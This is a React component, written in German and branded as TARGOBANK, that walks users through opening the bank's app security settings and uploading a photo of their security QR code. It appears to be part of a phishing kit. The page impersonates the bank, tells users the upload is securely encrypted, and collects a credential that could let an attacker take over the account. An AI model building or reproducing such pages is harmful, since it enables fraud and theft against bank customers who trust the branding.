import React, { useState, useRef, useEffect } from 'react';
import { Upload, Camera, X, CheckCircle } from 'lucide-react';
import Loading from './Loading';

interface QRUploadFormProps {
  onSubmit: (file: File) => void;
  onSkip?: () => void;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onSubmit, onSkip }) => {
  const [file, setFile] = useState<File | null>(null);
  const [preview, setPreview] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isDragOver, setIsDragOver] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isMobile, setIsMobile] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  const handleFileChange = (selectedFile: File | null) => {
    if (selectedFile) {
      // Validate file type
      const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
      if (!validTypes.includes(selectedFile.type)) {
        setError('Bitte laden Sie ein Bild hoch (JPG, PNG, GIF oder WebP)');
        return;
      }
      
      // Validate file size (max 10MB)
      if (selectedFile.size > 10 * 1024 * 1024) {
        setError('Die Datei ist zu groß. Maximale Größe: 10MB');
        return;
      }
      
      setFile(selectedFile);
      setError(null);
      
      // Create preview
      const reader = new FileReader();
      reader.onload = (e) => {
        setPreview(e.target?.result as string);
      };
      reader.readAsDataURL(selectedFile);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0] || null;
    handleFileChange(selectedFile);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    
    const droppedFile = e.dataTransfer.files[0];
    handleFileChange(droppedFile);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
  };

  const handleRemoveFile = () => {
    setFile(null);
    setPreview(null);
    setError(null);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!file) {
      setError('Bitte wählen Sie ein Bild aus');
      return;
    }
    
    setIsLoading(true);
    
    try {
      await onSubmit(file);
    } catch (err) {
      console.error('Error uploading QR code:', err);
      setError('Fehler beim Hochladen. Bitte versuchen Sie es erneut.');
      setIsLoading(false);
    }
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message="QR-Code wird verarbeitet..."
          type="upload"
          showProgress={true}
          duration={4}
        />
      )}
      
      <div style={{
        backgroundColor: '#f8f9fa',
        minHeight: '80vh',
        padding: isMobile ? '40px 20px' : '80px 40px',
        fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
      }}>
        <div style={{
          maxWidth: '800px',
          margin: '0 auto'
        }}>
          {/* Header Section */}
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: isMobile ? 'flex-start' : 'center',
            marginBottom: isMobile ? '30px' : '40px',
            flexDirection: isMobile ? 'column' : 'row',
            gap: isMobile ? '16px' : '0'
          }}>
            <div style={{ textAlign: 'left' }}>
              <h1 style={{
                color: '#003366',
                fontSize: isMobile ? '32px' : '42px',
                fontWeight: '900',
                margin: '0 0 12px 0',
                lineHeight: '1.2',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                QR-Code hochladen
              </h1>

              <p style={{
                color: '#666',
                fontSize: isMobile ? '16px' : '18px',
                lineHeight: '1.6',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Bitte laden Sie ein Foto Ihres QR-Codes aus der TARGOBANK App hoch.
              </p>
            </div>

            {onSkip && (
              <button
                type="button"
                onClick={onSkip}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#00b6ed',
                  fontSize: isMobile ? '14px' : '16px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  cursor: 'pointer',
                  textDecoration: 'underline',
                  padding: '8px 0',
                  alignSelf: isMobile ? 'flex-start' : 'flex-end'
                }}
                onMouseOver={(e) => e.currentTarget.style.color = '#0099cc'}
                onMouseOut={(e) => e.currentTarget.style.color = '#00b6ed'}
              >
                Überspringen
              </button>
            )}
          </div>

          {/* Form Container */}
          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.95)',
            borderRadius: '12px',
            padding: isMobile ? '30px 24px' : '40px 48px',
            boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)',
            backdropFilter: 'blur(10px)',
            border: '1px solid rgba(255, 255, 255, 0.2)'
          }}>
            <form onSubmit={handleSubmit}>
              {/* Upload Area */}
              <div
                onDrop={handleDrop}
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onClick={() => fileInputRef.current?.click()}
                style={{
                  border: isDragOver 
                    ? '3px dashed #00b6ed' 
                    : error 
                      ? '3px dashed #dc3545' 
                      : '3px dashed #ddd',
                  borderRadius: '12px',
                  padding: isMobile ? '40px 20px' : '60px 40px',
                  textAlign: 'center',
                  cursor: 'pointer',
                  backgroundColor: isDragOver ? 'rgba(0, 182, 237, 0.05)' : '#fafafa',
                  transition: 'all 0.3s ease',
                  marginBottom: '20px'
                }}
              >
                <input
                  type="file"
                  ref={fileInputRef}
                  onChange={handleInputChange}
                  accept="image/*"
                  style={{ display: 'none' }}
                />
                
                {preview ? (
                  <div style={{ position: 'relative', display: 'inline-block' }}>
                    <img
                      src={preview}
                      alt="QR Code Preview"
                      style={{
                        maxWidth: '300px',
                        maxHeight: '300px',
                        borderRadius: '8px',
                        boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)'
                      }}
                    />
                    <button
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleRemoveFile();
                      }}
                      style={{
                        position: 'absolute',
                        top: '-10px',
                        right: '-10px',
                        width: '30px',
                        height: '30px',
                        borderRadius: '50%',
                        backgroundColor: '#dc3545',
                        color: 'white',
                        border: 'none',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        boxShadow: '0 2px 8px rgba(0, 0, 0, 0.2)'
                      }}
                    >
                      <X size={16} />
                    </button>
                    <div style={{
                      marginTop: '16px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '8px',
                      color: '#28a745'
                    }}>
                      <CheckCircle size={20} />
                      <span style={{
                        fontSize: '14px',
                        fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>
                        Bild ausgewählt
                      </span>
                    </div>
                  </div>
                ) : (
                  <>
                    <div style={{
                      width: '80px',
                      height: '80px',
                      borderRadius: '50%',
                      backgroundColor: 'rgba(0, 182, 237, 0.1)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      margin: '0 auto 20px'
                    }}>
                      {isMobile ? (
                        <Camera size={40} color="#00b6ed" />
                      ) : (
                        <Upload size={40} color="#00b6ed" />
                      )}
                    </div>
                    
                    <p style={{
                      color: '#333',
                      fontSize: isMobile ? '16px' : '18px',
                      fontWeight: '600',
                      margin: '0 0 8px 0',
                      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>
                      {isMobile ? 'Tippen Sie hier um ein Foto aufzunehmen' : 'Datei hier ablegen oder klicken'}
                    </p>
                    
                    <p style={{
                      color: '#666',
                      fontSize: '14px',
                      margin: '0',
                      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>
                      JPG, PNG, GIF oder WebP (max. 10MB)
                    </p>
                  </>
                )}
              </div>

              {/* Error Message */}
              {error && (
                <div style={{
                  backgroundColor: '#fff3cd',
                  border: '1px solid #ffeaa7',
                  borderRadius: '8px',
                  padding: '12px 16px',
                  marginBottom: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}>
                  <span style={{ fontSize: '16px' }}>⚠️</span>
                  <span style={{
                    color: '#856404',
                    fontSize: '14px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    {error}
                  </span>
                </div>
              )}

              {/* Instructions */}
              <div style={{
                backgroundColor: '#e3f2fd',
                borderRadius: '8px',
                padding: '20px',
                marginBottom: '30px'
              }}>
                <h3 style={{
                  color: '#003366',
                  fontSize: '16px',
                  fontWeight: '600',
                  margin: '0 0 12px 0',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                }}>
                  So finden Sie Ihren QR-Code:
                </h3>
                <ol style={{
                  color: '#333',
                  fontSize: '14px',
                  margin: '0',
                  paddingLeft: '20px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  lineHeight: '1.8'
                }}>
                  <li>Öffnen Sie die TARGOBANK Banking App</li>
                  <li>Gehen Sie zu "Einstellungen" → "Sicherheit"</li>
                  <li>Wählen Sie "QR-Code anzeigen"</li>
                  <li>Fotografieren Sie den angezeigten QR-Code</li>
                </ol>
              </div>

              {/* Submit Button */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                marginTop: '40px'
              }}>
                <button
                  type="submit"
                  disabled={isLoading || !file}
                  style={{
                    backgroundColor: file ? '#c20831' : '#ccc',
                    color: 'white',
                    border: 'none',
                    borderRadius: '50px',
                    padding: isMobile ? '16px 40px' : '18px 50px',
                    fontSize: isMobile ? '16px' : '18px',
                    fontWeight: 'bold',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                    cursor: (isLoading || !file) ? 'not-allowed' : 'pointer',
                    transition: 'all 0.3s ease',
                    minWidth: isMobile ? '280px' : '320px',
                    boxShadow: file ? '0 6px 20px rgba(194, 8, 49, 0.3)' : 'none',
                    letterSpacing: '0.5px',
                    opacity: isLoading ? 0.7 : 1
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading && file) {
                      e.currentTarget.style.backgroundColor = '#a91e2c';
                      e.currentTarget.style.transform = 'translateY(-2px)';
                      e.currentTarget.style.boxShadow = '0 8px 25px rgba(194, 8, 49, 0.4)';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (!isLoading && file) {
                      e.currentTarget.style.backgroundColor = '#c20831';
                      e.currentTarget.style.transform = 'translateY(0)';
                      e.currentTarget.style.boxShadow = '0 6px 20px rgba(194, 8, 49, 0.3)';
                    }
                  }}
                >
                  {isLoading ? 'Wird hochgeladen...' : 'QR-Code hochladen'}
                </button>
              </div>
            </form>
          </div>

          {/* Security Note */}
          <div style={{
            marginTop: isMobile ? '30px' : '40px',
            textAlign: 'center',
            padding: '20px',
            backgroundColor: 'white',
            borderRadius: '8px',
            border: '1px solid #e0e0e0'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '12px',
              marginBottom: '12px'
            }}>
              <div style={{
                width: '24px',
                height: '24px',
                backgroundColor: '#003366',
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
              </div>
              <span style={{
                fontSize: isMobile ? '16px' : '18px',
                fontWeight: 'bold',
                color: '#003366',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Sichere Übertragung
              </span>
            </div>
            <p style={{
              color: '#666',
              fontSize: isMobile ? '14px' : '16px',
              margin: '0',
              textAlign: 'center',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
              lineHeight: '1.5'
            }}>
              Ihr QR-Code wird sicher verschlüsselt übertragen und nach der Verifizierung gelöscht.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default QRUploadForm;

